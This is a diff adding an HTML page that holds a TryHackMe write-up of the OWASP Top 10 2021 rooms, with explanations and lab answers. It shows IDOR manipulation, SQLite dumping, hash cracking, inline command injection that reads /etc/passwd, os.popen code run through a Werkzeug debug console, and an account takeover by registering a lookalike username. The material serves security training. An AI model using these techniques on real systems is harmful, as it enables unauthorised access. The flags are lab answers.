@@ -1,0 +1,1184 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>OWASP Top 10 2021 · THM Writeups</title>
+  
+
+  <!-- Security headers -->
+  <meta http-equiv="X-Frame-Options" content="DENY" />
+  <meta http-equiv="Content-Security-Policy" content="default-src 'self'; style-src 'self' https://fonts.googleapis.com 'unsafe-inline'; font-src https://fonts.gstatic.com; img-src 'self' data: https:; script-src 'self' 'unsafe-inline';" />
+  <meta http-equiv="X-Content-Type-Options" content="nosniff" />
+  <meta name="referrer" content="no-referrer" />
+
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;600;700&family=Syne:wght@400;600;700;800&display=swap" rel="stylesheet" />
+  <link rel="stylesheet" href="/tryhackme/assets/css/style.css" />
+</head>
+<body>
+
+<div class="bg-grid"></div>
+<div class="scanlines"></div>
+
+<nav id="navbar">
+  <div class="nav-inner">
+    <a href="/tryhackme/" class="nav-logo">
+      <span class="prompt">~/george/thm</span><span class="cursor-blink">_</span>
+    </a>
+    <div class="nav-right">
+      <a href="/tryhackme/" class="nav-link"><span class="cmd-prefix">./</span>index</a>
+      <a href="https://georgenadejde.github.io" target="_blank" rel="noopener noreferrer" class="nav-link">
+        <span class="cmd-prefix">~/</span>portfolio
+      </a>
+    </div>
+  </div>
+</nav>
+
+<main class="writeup-main">
+  <div class="container">
+
+    <!-- Breadcrumb -->
+    <div class="breadcrumb">
+      <a href="/tryhackme/">writeups</a>
+      <span class="breadcrumb-sep">→</span>
+      <span>OWASP Top 10 2021</span>
+    </div>
+
+    <!-- Writeup header -->
+    <div class="writeup-header">
+      <div class="terminal-bar">
+        <span class="dot dot-red"></span>
+        <span class="dot dot-yellow"></span>
+        <span class="dot dot-green"></span>
+        <span class="terminal-title">OWASP Top 10 - 2021/README.md</span>
+      </div>
+      <div class="writeup-meta">
+        <span class="platform-badge">TryHackMe</span>
+        
+          
+          <span class="tag-pill">owasp</span>
+          
+        
+        
+      </div>
+    </div>
+
+    <!-- Writeup body: sidebar + content -->
+    <div class="writeup-body">
+
+      <!-- ToC Sidebar -->
+      <aside class="toc-sidebar" id="tocSidebar">
+        <div class="toc-header">
+          <span class="toc-label">$ cat --toc</span>
+          <button class="toc-toggle" id="tocToggle" aria-label="Toggle table of contents">✕</button>
+        </div>
+        <nav class="toc-nav" id="tocNav">
+          <p class="toc-empty">No headings found.</p>
+        </nav>
+      </aside>
+
+      <!-- Main content -->
+      <div class="writeup-content-wrap">
+        <article class="writeup-content" id="writeupContent">
+          <h1 id="owasp-top-10---2021">OWASP Top 10 - 2021</h1>
+
+<h2 id="1-broken-access-control">1. Broken Access Control</h2>
+
+<ul>
+  <li>
+    <p>If a website visitor can access protected pages they are not meant to see, then the access controls are broken.</p>
+  </li>
+  <li>
+    <p>Broken access control allows attackers to bypass <strong>authorisation</strong>, allowing them to view sensitive data or perform tasks they aren’t supposed to.</p>
+  </li>
+  <li>For example, a <a href="https://bugs.xdavidhu.me/google/2021/01/11/stealing-your-private-videos-one-frame-at-a-time/">vulnerability was found in 2019</a>, where an attacker could get any single frame from a Youtube video marked as private.
+    <ul>
+      <li>The researcher who found the vulnerability showed that he could ask for several frames and somewhat reconstruct the video.</li>
+      <li>Since the expectation from a user when marking a video as private would be that nobody had access to it, this was indeed accepted as a broken access control vulnerability.
+        <h2 id="1-broken-access-control-idor-challenge">1. Broken Access Control (IDOR Challenge)</h2>
+      </li>
+    </ul>
+  </li>
+  <li><strong>IDOR</strong> or <strong>Insecure Direct Object Reference</strong> refers to an access control vulnerability where you can access resources you wouldn’t ordinarily be able to see.
+    <ul>
+      <li>This occurs when the programmer exposes a Direct Object Reference, which is just an identifier that refers to specific objects within the server.</li>
+      <li>By object, we could mean a file, a user, a bank account in a banking application, or anything really.
+        <h3 id="questions">Questions</h3>
+      </li>
+    </ul>
+  </li>
+</ul>
+
+<p>Look at other users’ notes. What is the flag?</p>
+
+<p><img src="/tryhackme/OWASP%20Top%2010%20-%202021/Pasted%20image%2020240923154336.png" alt="" /></p>
+
+<ul>
+  <li>change <code class="language-plaintext highlighter-rouge">note_id</code> in the URL to 0 and the flags appears</li>
+</ul>
+
+<p><img src="/tryhackme/OWASP%20Top%2010%20-%202021/Pasted%20image%2020240923154449.png" alt="" /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>`A: flag{fivefourthree}`
+</code></pre></div></div>
+
+<h2 id="cryptographic-failures">Cryptographic Failures</h2>
+
+<ul>
+  <li>A <strong>cryptographic failure</strong> refers to any vulnerability arising from the misuse (or lack of use) of cryptographic algorithms for protecting sensitive information.
+    <ul>
+      <li>Web applications require cryptography to provide confidentiality for their users at many levels.</li>
+    </ul>
+  </li>
+  <li><strong>encrypting data in transit</strong> =  the encryption of the network traffic between the client and server</li>
+  <li><strong>encrypting data at rest</strong> = the encryption of stored data (usually on a server)</li>
+</ul>
+
+<h2 id="cryptographic-failures-supporting-material-1">Cryptographic Failures (Supporting Material 1)</h2>
+
+<ul>
+  <li>The most common way to store a large amount of data in a format easily accessible from many locations is in a database.
+    <ul>
+      <li>This is perfect for something like a web application, as many users may interact with the website at any time.</li>
+      <li>Database engines usually follow the Structured Query Language (SQL) syntax.</li>
+    </ul>
+  </li>
+  <li>Databases can also be stored as files.
+    <ul>
+      <li>These are referred to as “<strong>flat-file</strong>” databases, as they are stored as a single file on the computer.</li>
+      <li>This is much easier than setting up an entire database server and could potentially be seen in smaller web applications.</li>
+    </ul>
+  </li>
+  <li>What happens if the database is stored underneath the root directory of the website (i.e. one of the files accessible to the user connecting to the website)?
+    <ul>
+      <li>Well, we can download and query it on our own machine, with full access to everything in the database. Sensitive Data Exposure, indeed!</li>
+    </ul>
+  </li>
+  <li>The most common (and simplest) format of a flat-file database is an SQLite database.
+    <ul>
+      <li>These can be interacted with in most programming languages and have a dedicated client for querying them on the command line.</li>
+      <li>This client is called <code class="language-plaintext highlighter-rouge">sqlite3</code> and is installed on many Linux distributions by default.</li>
+    </ul>
+  </li>
+  <li>use <code class="language-plaintext highlighter-rouge">PRAGMA table_info(customers);</code> to see the table information and then do a <code class="language-plaintext highlighter-rouge">SELECT *</code> query to dump the contents</li>
+</ul>
+
+<h2 id="cryptographic-failures-supporting-material-2">Cryptographic Failures (Supporting Material 2)</h2>
+
+<ul>
+  <li>we will be using the online tool to crack password hashes: <a href="https://crackstation.net/">Crackstation</a>. This website is extremely good at cracking weak password hashes. For more complicated hashes, we would need more sophisticated tools</li>
+</ul>
+
+<h2 id="cryptographic-failures-challenge">Cryptographic Failures (Challenge)</h2>
+
+<h3 id="questions-1">Questions</h3>
+
+<p>What is the name of the mentioned directory?</p>
+
+<p><img src="/tryhackme/OWASP%20Top%2010%20-%202021/Pasted%20image%2020240923171751.png" alt="" /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>`A: /assets`
+</code></pre></div></div>
+
+<p>Navigate to the directory you found in question one. What file stands out as being likely to contain sensitive data?</p>
+
+<p><img src="/tryhackme/OWASP%20Top%2010%20-%202021/Pasted%20image%2020240923172004.png" alt="" /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>`A: webapp.db`
+</code></pre></div></div>
+
+<p>Use the supporting material to access the sensitive data. What is the password hash of the admin user?</p>
+
+<p><img src="/tryhackme/OWASP%20Top%2010%20-%202021/Pasted%20image%2020240923172339.png" alt="" /></p>
+
+<p><img src="/tryhackme/OWASP%20Top%2010%20-%202021/Pasted%20image%2020240923172356.png" alt="" /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>`A: 6eea9b7ef19179a06954edd0f6c05ceb`
+</code></pre></div></div>
+
+<p>Crack the hash.<br />
+What is the admin’s plaintext password?</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>`A: qwertyuiop`
+</code></pre></div></div>
+
+<p>Log in as the admin. What is the flag?</p>
+
+<ul>
+  <li>
+    <p>user the credentials <code class="language-plaintext highlighter-rouge">admin:qwertyuiop</code> on the login page of the website.</p>
+
+    <p><code class="language-plaintext highlighter-rouge">A: THM{Yzc2YjdkMjE5N2VjMzNhOTE3NjdiMjdl} </code></p>
+  </li>
+</ul>
+
+<h2 id="3-injection">3. Injection</h2>
+
+<ul>
+  <li><strong>Injection</strong> flaws are very common in applications today.
+    <ul>
+      <li>These flaws occur because the application interprets user-controlled input as commands or parameters.</li>
+    </ul>
+  </li>
+  <li>Injection attacks depend on what technologies are used and how these technologies interpret the input.</li>
+  <li>Some common examples include:
+    <ul>
+      <li><strong>SQL Injection:</strong> 
+        <ul>
+          <li>This occurs when user-controlled input is passed to SQL queries.</li>
+          <li>As a result, an attacker can pass in SQL queries to manipulate the outcome of such queries.</li>
+          <li>This could potentially allow the attacker to access, modify and delete information in a database when this input is passed into database queries.</li>
+          <li>This would mean an attacker could steal sensitive information such as personal details and credentials.</li>
+        </ul>
+      </li>
+    </ul>
+  </li>
+  <li><strong>Command Injection:</strong> 
+    <ul>
+      <li>This occurs when user input is passed to system commands.</li>
+      <li>As a result, an attacker can execute arbitrary system commands on application servers, potentially allowing them to access users’ systems.</li>
+    </ul>
+  </li>
+  <li>The main defence for preventing injection attacks is ensuring that user-controlled input is not interpreted as queries or commands.</li>
+  <li>There are different ways of doing this:
+    <ul>
+      <li><strong>Using an allow list:</strong> 
+        <ul>
+          <li>when input is sent to the server, this input is compared to a list of safe inputs or characters.</li>
+          <li>If the input is marked as safe, then it is processed.</li>
+          <li>Otherwise, it is rejected, and the application throws an error.</li>
+        </ul>
+      </li>
+      <li><strong>Stripping input:</strong> 
+        <ul>
+          <li>If the input contains dangerous characters, these are removed before processing.</li>
+        </ul>
+      </li>
+    </ul>
+  </li>
+</ul>
+
+<h2 id="31-command-injection">3.1 Command Injection</h2>
+
+<ul>
+  <li><strong>Command Injection</strong> occurs when server-side code (like PHP) in a web application makes a call to a function that interacts with the server’s console directly.</li>
+  <li>An injection web vulnerability allows an attacker to take advantage of that call to execute operating system commands arbitrarily on the server.
+    <ul>
+      <li>The possibilities for the attacker from here are endless: they could list files, read their contents, run some basic commands to do some recon on the server or whatever they wanted, just as if they were sitting in front of the server and issuing commands directly into the command line.</li>
+    </ul>
+  </li>
+</ul>
+
+<p><img src="/tryhackme/OWASP%20Top%2010%20-%202021/Pasted%20image%2020240923173353.png" alt="" /></p>
+
+<ul>
+  <li>Bash allows you to run commands within commands.</li>
+  <li>
+    <p>This is useful for many reasons, but in our case, it will be used to inject a command within the cowsay server to get it executed.</p>
+  </li>
+  <li>To execute inline commands, you only need to enclose them in the following format <code class="language-plaintext highlighter-rouge">$(your_command_here)</code>.
+    <ul>
+      <li>If the console detects an inline command, it will execute it first and then use the result as the parameter for the outer command.</li>
+    </ul>
+  </li>
+  <li>Look at the following example, which runs <code class="language-plaintext highlighter-rouge">whoami</code> as an inline command inside an <code class="language-plaintext highlighter-rouge">echo</code> command:</li>
+</ul>
+
+<p><img src="/tryhackme/OWASP%20Top%2010%20-%202021/b7158502a9799698ec0ab29a850c8840.png" alt="Inline commands" /></p>
+
+<ul>
+  <li>Since the application accepts any input from us, we can inject an inline command which will get executed and used as a parameter for cowsay.
+    <ul>
+      <li>This will make our cow say whatever the command returns!</li>
+    </ul>
+  </li>
+  <li>Here are some other commands you may want to try:
+    <ul>
+      <li>whoami</li>
+      <li>id</li>
+      <li>ifconfig/ip addr</li>
+      <li>uname -a</li>
+      <li>ps -ef</li>
+    </ul>
+  </li>
+</ul>
+
+<h3 id="questions-2">Questions</h3>
+
+<p>What strange text file is in the website’s root directory?</p>
+
+<p><img src="/tryhackme/OWASP%20Top%2010%20-%202021/Pasted%20image%2020240923174555.png" alt="" /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>`A: drpepper.txt`
+</code></pre></div></div>
+
+<p>How many non-root/non-service/non-daemon users are there?<br />
+<img src="/tryhackme/OWASP%20Top%2010%20-%202021/Pasted%20image%2020240923175202.png" alt="" /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>`A: 0`
+</code></pre></div></div>
+
+<p>What user is this app running as?</p>
+
+<p><img src="/tryhackme/OWASP%20Top%2010%20-%202021/Pasted%20image%2020240923175331.png" alt="" /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>`A: apache`
+</code></pre></div></div>
+
+<p>What is the user’s shell set as?</p>
+
+<ul>
+  <li>
+    <p>Check the output of <code class="language-plaintext highlighter-rouge">etc/passwd</code> under <code class="language-plaintext highlighter-rouge">apache</code></p>
+
+    <p><code class="language-plaintext highlighter-rouge">A: /sbin/nologin</code></p>
+  </li>
+</ul>
+
+<p>What version of Alpine Linux is running?</p>
+
+<p><img src="/tryhackme/OWASP%20Top%2010%20-%202021/Pasted%20image%2020240923175445.png" alt="" /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>`A: 3.16.0`
+</code></pre></div></div>
+
+<h2 id="insecure-design">Insecure design</h2>
+
+<ul>
+  <li><strong>Insecure design</strong> refers to vulnerabilities which are inherent to the application’s architecture.
+    <ul>
+      <li>They are not vulnerabilities regarding bad implementations or configurations, but the idea behind the whole application (or a part of it) is flawed from the start.</li>
+      <li>Most of the time, these vulnerabilities occur when an improper threat modelling is made during the planning phases of the application and propagate all the way up to your final app.</li>
+      <li>Some other times, insecure design vulnerabilities may also be introduced by developers while adding some “shortcuts” around the code to make their testing easier.</li>
+      <li>A developer could, for example, disable the OTP validation in the development phases to quickly test the rest of the app without manually inputting a code at each login but forget to re-enable it when sending the application to production.</li>
+    </ul>
+  </li>
+  <li>A good example of such vulnerabilities occurred on <a href="https://thezerohack.com/hack-any-instagram">Instagram a while ago</a>.
+    <ul>
+      <li>Instagram allowed users to reset their forgotten passwords by sending them a 6-digit code to their mobile number via SMS for validation.</li>
+      <li>If an attacker wanted to access a victim’s account, he could try to brute-force the 6-digit code.</li>
+    </ul>
+  </li>
+  <li>As expected, this was not directly possible as Instagram had rate-limiting implemented so that after 250 attempts, the user would be blocked from trying further.</li>
+  <li>However, it was found that the rate-limiting only applied to code attempts made from the same IP.
+    <ul>
+      <li>If an attacker had several different IP addresses from where to send requests, he could now try 250 codes per IP.
+        <ul>
+          <li>For a 6-digit code, you have a million possible codes, so an attacker would need 1000000/250 = 4000 IPs to cover all possible codes. </li>
+        </ul>
+      </li>
+    </ul>
+  </li>
+  <li>
+    <p>This may sound like an insane amount of IPs to have, but cloud services make it easy to get them at a relatively small cost, making this attack feasible.</p>
+  </li>
+  <li>Notice how the vulnerability is related to the idea that no user would be capable of using thousands of IP addresses to make concurrent requests to try and brute-force a numeric code.
+    <ul>
+      <li>The problem is in the design rather than the implementation of the application in itself.</li>
+    </ul>
+  </li>
+  <li>The best approach to avoid such vulnerabilities is to perform threat modelling at the early stages of the development lifecycle.</li>
+</ul>
+
+<h3 id="questions-3">Questions</h3>
+
+<p>What is the value of the flag in joseph’s account?</p>
+
+<ul>
+  <li>Reset Joseph’s password by entering the username <code class="language-plaintext highlighter-rouge">joseph</code> in the reset password menu</li>
+  <li>choose the favourite colour question and simply brute force it</li>
+</ul>
+
+<p><img src="/tryhackme/OWASP%20Top%2010%20-%202021/Pasted%20image%2020240924101121.png" alt="" /></p>
+
+<p><img src="/tryhackme/OWASP%20Top%2010%20-%202021/Pasted%20image%2020240924101001.png" alt="" /></p>
+
+<ul>
+  <li>then login using the given password and the username <code class="language-plaintext highlighter-rouge">joseph</code></li>
+</ul>
+
+<p><img src="/tryhackme/OWASP%20Top%2010%20-%202021/Pasted%20image%2020240924101209.png" alt="" /></p>
+
+<ul>
+  <li>naivgate to private and then there is a file with the flag in it</li>
+</ul>
+
+<p><img src="/tryhackme/OWASP%20Top%2010%20-%202021/Pasted%20image%2020240924101250.png" alt="" /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>`A: THM{Not_3ven_c4tz_c0uld_sav3_U!}`
+</code></pre></div></div>
+
+<h2 id="5-security-misconfigurations">5. Security Misconfigurations</h2>
+
+<ul>
+  <li>
+    <p>Security Misconfigurations are distinct from the other Top 10 vulnerabilities because they occur when security could have been appropriately configured but was not.</p>
+  </li>
+  <li>Security misconfigurations include:
+    <ul>
+      <li>Poorly configured permissions on cloud services, like S3 buckets.</li>
+      <li>Having unnecessary features enabled, like services, pages, accounts or privileges.</li>
+      <li>Default accounts with unchanged passwords.</li>
+      <li>Error messages that are overly detailed and allow attackers to find out more about the system.</li>
+      <li>Not using <a href="https://owasp.org/www-project-secure-headers/">HTTP security headers</a>.</li>
+    </ul>
+  </li>
+  <li>A common security misconfiguration concerns the exposure of debugging features in production software.
+    <ul>
+      <li>Debugging features are often available in programming frameworks to allow the developers to access advanced functionality that is useful for debugging an application while it’s being developed.</li>
+    </ul>
+  </li>
+  <li>
+    <p>Attackers could abuse some of those debug functionalities if somehow, the developers forgot to disable them before publishing their applications.</p>
+  </li>
+  <li>One example of such a vulnerability was allegedly used when <a href="https://labs.detectify.com/2015/10/02/how-patreon-got-hacked-publicly-exposed-werkzeug-debugger/">Patreon got hacked in 2015</a>.
+    <ul>
+      <li>Five days before Patreon was hacked, a security researcher reported to Patreon that he had found an open debug interface for a Werkzeug console.</li>
+      <li>Werkzeug is a vital component in Python-based web applications as it provides an interface for web servers to execute the Python code.</li>
+    </ul>
+  </li>
+  <li>Werkzeug includes a debug console that can be accessed either via URL on <code class="language-plaintext highlighter-rouge">/console</code>, or it will also be presented to the user if an exception is raised by the application.</li>
+  <li>In both cases, the console provides a Python console that will run any code you send to it. For an attacker, this means he can execute commands arbitrarily.</li>
+</ul>
+
+<h3 id="questions-4">Questions</h3>
+
+<p>What is the database file name (the one with the .db extension) in the current directory?</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">os</span><span class="p">;</span> <span class="k">print</span><span class="p">(</span><span class="n">os</span><span class="p">.</span><span class="n">popen</span><span class="p">(</span><span class="s">"ls -l"</span><span class="p">).</span><span class="n">read</span><span class="p">())</span>
+</code></pre></div></div>
+
+<p><img src="/tryhackme/OWASP%20Top%2010%20-%202021/Pasted%20image%2020240925113559.png" alt="" /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>`A: todo.db`
+</code></pre></div></div>
+
+<p>Modify the code to read the contents of the <code class="language-plaintext highlighter-rouge">app.py</code> file, which contains the application’s source code. What is the value of the <code class="language-plaintext highlighter-rouge">secret_flag</code> variable in the source code?</p>
+
+<p><img src="/tryhackme/OWASP%20Top%2010%20-%202021/Pasted%20image%2020240925113715.png" alt="" /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>`A: THM{Just_a_tiny_misconfiguration}`
+</code></pre></div></div>
+
+<h2 id="vulnerable-and-outdated-components">Vulnerable and Outdated Components</h2>
+
+<ul>
+  <li>
+    <p>Occasionally, you may find that the company/entity you’re pen-testing is using a program with a well-known vulnerability.</p>
+  </li>
+  <li>For example, let’s say that a company hasn’t updated their version of WordPress for a few years, and using a tool such as <a href="https://wpscan.com/">WPScan</a>, you find that it’s version 4.6.
+    <ul>
+      <li>Some quick research will reveal that WordPress 4.6 is vulnerable to an unauthenticated remote code execution(RCE) exploit, and even better, you can find an exploit already made on <a href="https://www.exploit-db.com/exploits/41962">Exploit-DB</a>.</li>
+    </ul>
+  </li>
+  <li>As you can see, this would be quite devastating because it requires very little work on the attacker’s part.</li>
+  <li>Since the vulnerability is already well known, someone else has likely made an exploit for the vulnerability already.
+    <ul>
+      <li>The situation worsens when you realise that it’s really easy for this to happen.</li>
+    </ul>
+  </li>
+  <li>If a company misses a single update for a program they use, it could be vulnerable to any number of attacks.</li>
+</ul>
+
+<h2 id="vulnerable-and-outdated-components---exploit">Vulnerable and Outdated Components - Exploit</h2>
+
+<ul>
+  <li>Exploits you download from the Internet may not work the first time.
+    <ul>
+      <li>It helps to understand the programming language the script is in so that, if needed, you can fix any bugs or make any modifications, as quite a few scripts on Exploit-DB expect you to make modifications.</li>
+    </ul>
+  </li>
+</ul>
+
+<h2 id="vulnerable-and-outdated-components---lab">Vulnerable and Outdated Components - Lab</h2>
+
+<h3 id="questions-5">Questions</h3>
+
+<p>What is the content of the /opt/flag.txt file?</p>
+
+<p><img src="/tryhackme/OWASP%20Top%2010%20-%202021/Pasted%20image%2020240925120033.png" alt="" /></p>
+
+<p><img src="/tryhackme/OWASP%20Top%2010%20-%202021/Pasted%20image%2020240925120343.png" alt="" /></p>
+
+<ul>
+  <li>
+    <p>the flag is in <code class="language-plaintext highlighter-rouge">/opt/flag.txt</code></p>
+
+    <p><code class="language-plaintext highlighter-rouge">A: THM{But_1ts_n0t_my_f4ult!}</code></p>
+  </li>
+</ul>
+
+<h2 id="identification-and-authentication-failures">Identification and Authentication Failures</h2>
+
+<ul>
+  <li>Authentication and session management constitute core components of modern web applications.</li>
+  <li>Authentication allows users to gain access to web applications by verifying their identities.
+    <ul>
+      <li>The most common form of authentication is using a username and password mechanism.</li>
+      <li>A user would enter these credentials, and the server would verify them.</li>
+    </ul>
+  </li>
+  <li>The server would then provide the users’ browser with a session cookie if they are correct.
+    <ul>
+      <li>A session cookie is needed because web servers use HTTP(S) to communicate, which is stateless.</li>
+    </ul>
+  </li>
+  <li>Attaching session cookies means the server will know who is sending what data.
+    <ul>
+      <li>The server can then keep track of users’ actions. </li>
+    </ul>
+  </li>
+  <li>If an attacker is able to find flaws in an authentication mechanism, they might successfully gain access to other users’ accounts.
+    <ul>
+      <li>This would allow the attacker to access sensitive data (depending on the purpose of the application).</li>
+    </ul>
+  </li>
+  <li>Some common flaws in authentication mechanisms include the following:
+    <ul>
+      <li><strong>Brute force attacks:</strong> 
+        <ul>
+          <li>If a web application uses usernames and passwords, an attacker can try to launch brute force attacks that allow them to guess the username and passwords using multiple authentication attempts. </li>
+        </ul>
+      </li>
+      <li><strong>Use of weak credentials:</strong> 
+        <ul>
+          <li>Web applications should set strong password policies.</li>
+          <li>If applications allow users to set passwords such as “password1” or common passwords, an attacker can easily guess them and access user accounts.</li>
+        </ul>
+      </li>
+      <li><strong>Weak Session Cookies:</strong> Session cookies are how the server keeps track of users. If session cookies contain predictable values, attackers can set their own session cookies and access users’ accounts. </li>
+    </ul>
+  </li>
+  <li><em>Mitigations</em>:
+    <ul>
+      <li>To avoid password-guessing attacks, ensure the application enforces a strong password policy. </li>
+      <li>To avoid brute force attacks, ensure that the application enforces an automatic lockout after a certain number of attempts.
+        <ul>
+          <li>This would prevent an attacker from launching more brute-force attacks.</li>
+        </ul>
+      </li>
+      <li>Implement Multi-Factor Authentication.
+        <ul>
+          <li>If a user has multiple authentication methods, for example, using a username and password and receiving a code on their mobile device, it would be difficult for an attacker to get both the password and the code to access the account.</li>
+        </ul>
+      </li>
+    </ul>
+  </li>
+</ul>
+
+<h2 id="identification-and-authentication-failures---practical">Identification and Authentication Failures - Practical</h2>
+
+<h3 id="questions-6">Questions</h3>
+
+<p>What is the flag that you found in darren’s account?</p>
+
+<ul>
+  <li>
+    <p>Since the user <code class="language-plaintext highlighter-rouge">darren</code> already exists, we will register a new account called ` darre`
+<img src="/tryhackme/OWASP%20Top%2010%20-%202021/Pasted%20image%2020240925121247.png" alt="" /></p>
+
+    <p><code class="language-plaintext highlighter-rouge">A: fe86079416a21a3c99937fea8874b667</code></p>
+  </li>
+</ul>
+
+<p>Now try to do the same trick and see if you can log in as arthur. What is the flag that you found in arthur’s account?</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>`A: d9ac0f7db4fda460ac3edeb75d75e16e`
+</code></pre></div></div>
+
+<h2 id="8-software-and-data-integrity-failures">8. Software and Data Integrity Failures</h2>
+
+<ul>
+  <li>
+    <p><strong>integrity</strong> = the capacity we have to ascertain that a piece of data remains unmodified</p>
+  </li>
+  <li>How can you be sure that while downloading it, it wasn’t modified in transit or somehow got damaged by a transmission error?</li>
+  <li>To overcome this problem, you will often see a <strong>hash</strong> sent alongside the file so that you can prove that the file you downloaded kept its integrity and wasn’t modified in transit.</li>
+  <li>A hash or digest is simply a number that results from applying a specific algorithm over a piece of data. When reading about hashing algorithms, you will often read about MD5, SHA1, SHA256 or many others available.</li>
+</ul>
+
+<h2 id="software-integrity-failures">Software Integrity Failures</h2>
+
+<ul>
+  <li>Suppose you have a website that uses third-party libraries that are stored in some external servers that are out of your control.</li>
+  <li>While this may sound a bit strange, this is actually a somewhat common practice.</li>
+  <li>Take as an example jQuery, a commonly used javascript library. If you want, you can include jQuery in your website directly from their servers without actually downloading it by including the following line in the HTML code of your website:</li>
+</ul>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"https://code.jquery.com/jquery-3.6.1.min.js"</span><span class="nt">&gt;&lt;/script&gt;</span>
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <p>When a user navigates to your website, its browser will read its HTML code and download jQuery from the specified external source.</p>
+  </li>
+  <li>The problem is that if an attacker somehow hacks into the jQuery official repository, they could change the contents of <code class="language-plaintext highlighter-rouge">https://code.jquery.com/jquery-3.6.1.min.js</code> to inject malicious code.</li>
+  <li>As a result, anyone visiting your website would now pull the malicious code and execute it into their browsers unknowingly.</li>
+  <li>This is a software integrity failure as your website makes no checks against the third-party library to see if it has changed.</li>
+  <li>Modern browsers allow you to specify a hash along the library’s URL so that the library code is executed only if the hash of the downloaded file matches the expected value.</li>
+  <li>
+    <p>This security mechanism is called Subresource Integrity (SRI), and you can read more about it <a href="https://www.srihash.org/">here</a>.</p>
+  </li>
+  <li>The correct way to insert the library in your HTML code would be to use SRI and include an integrity hash so that if somehow an attacker is able to modify the library, any client navigating through your website won’t execute the modified version.</li>
+  <li>Here’s how that should look in HTML:</li>
+</ul>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"https://code.jquery.com/jquery-3.6.1.min.js"</span> <span class="na">integrity=</span><span class="s">"sha256-o88AwQnZB+VDvE9tvIXrMQaPlFFSUTR+nldQm1LuPXQ="</span> <span class="na">crossorigin=</span><span class="s">"anonymous"</span><span class="nt">&gt;&lt;/script&gt;</span>
+</code></pre></div></div>
+
+<h3 id="questions-7">Questions</h3>
+
+<p>What is the SHA-256 hash of <code class="language-plaintext highlighter-rouge">https://code.jquery.com/jquery-1.12.4.min.js</code>?</p>
+
+<p><img src="/tryhackme/OWASP%20Top%2010%20-%202021/Pasted%20image%2020240925131034.png" alt="" /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>`A: sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=`
+</code></pre></div></div>
+
+<h2 id="data-integrity-failures">Data Integrity Failures</h2>
+
+<h3 id="data-integrity-failures-1">Data Integrity failures</h3>
+
+<ul>
+  <li>How do web applications maintain sessions?
+    <ul>
+      <li>Usually, when a user logs into an application, they will be assigned some sort of session token that will need to be saved on the browser for as long as the session lasts.
+        <ul>
+          <li>This token will be repeated on each subsequent request so that the web application knows who we are.</li>
+        </ul>
+      </li>
+      <li>These session tokens can come in many forms but are usually assigned via cookies. 
+        <ul>
+          <li><strong>Cookies</strong> are key-value pairs that a web application will store on the user’s browser and that will be automatically repeated on each request to the website that issued them.</li>
+        </ul>
+      </li>
+    </ul>
+  </li>
+  <li>For example, you could assign a cookie to each user after logging in that contains their username.
+    <ul>
+      <li>In subsequent requests, your browser would always send your username in the cookie so that your web application knows what user is connecting.</li>
+    </ul>
+  </li>
+  <li>
+    <p>This would be a <em>terrible idea</em> security-wise because, as we mentioned, cookies are stored on the user’s browser, so if the user tampers with the cookie and changes the username, they could potentially impersonate someone else and read their emails!</p>
+  </li>
+  <li>One solution to this is to use some integrity mechanism to guarantee that the cookie hasn’t been altered by the user.
+    <ul>
+      <li>To avoid re-inventing the wheel, we could use some token implementations that allow you to do this and deal with all of the cryptography to provide proof of integrity without you having to bother with it.</li>
+    </ul>
+  </li>
+  <li>One such implementation is <strong>JSON Web Tokens (JWT)</strong>.
+    <ul>
+      <li>JWTs are very simple tokens that allow you to store key-value pairs on a token that provides integrity as part of the token.</li>
+    </ul>
+  </li>
+  <li>The idea is that you can generate tokens that you can give your users with the certainty that they won’t be able to alter the key-value pairs and pass the integrity check.</li>
+  <li>The structure of a JWT token is formed of 3 parts:</li>
+</ul>
+
+<p><img src="/tryhackme/OWASP%20Top%2010%20-%202021/11c86acaea05f98045cec5634e03e997.png" alt="JSON Web Tokens" /></p>
+
+<ul>
+  <li>The header contains metadata indicating this is a JWT, and the signing algorithm in use is HS256.</li>
+  <li>The payload contains the key-value pairs with the data that the web application wants the client to store.</li>
+  <li>The signature is similar to a hash, taken to verify the payload’s integrity.
+    <ul>
+      <li>If you change the payload, the web application can verify that the signature won’t match the payload and know that you tampered with the JWT.</li>
+    </ul>
+  </li>
+  <li>
+    <p>Unlike a simple hash, this signature involves the use of a secret key held by the server only, which means that if you change the payload, you won’t be able to generate the matching signature unless you know the secret key.</p>
+  </li>
+  <li>
+    <p>Notice that each of the 3 parts of the token is simply plaintext encoded with base64.</p>
+  </li>
+  <li><strong>Note:</strong> The signature contains binary data, so even if you decode it, you won’t be able to make much sense of it anyways.</li>
+</ul>
+
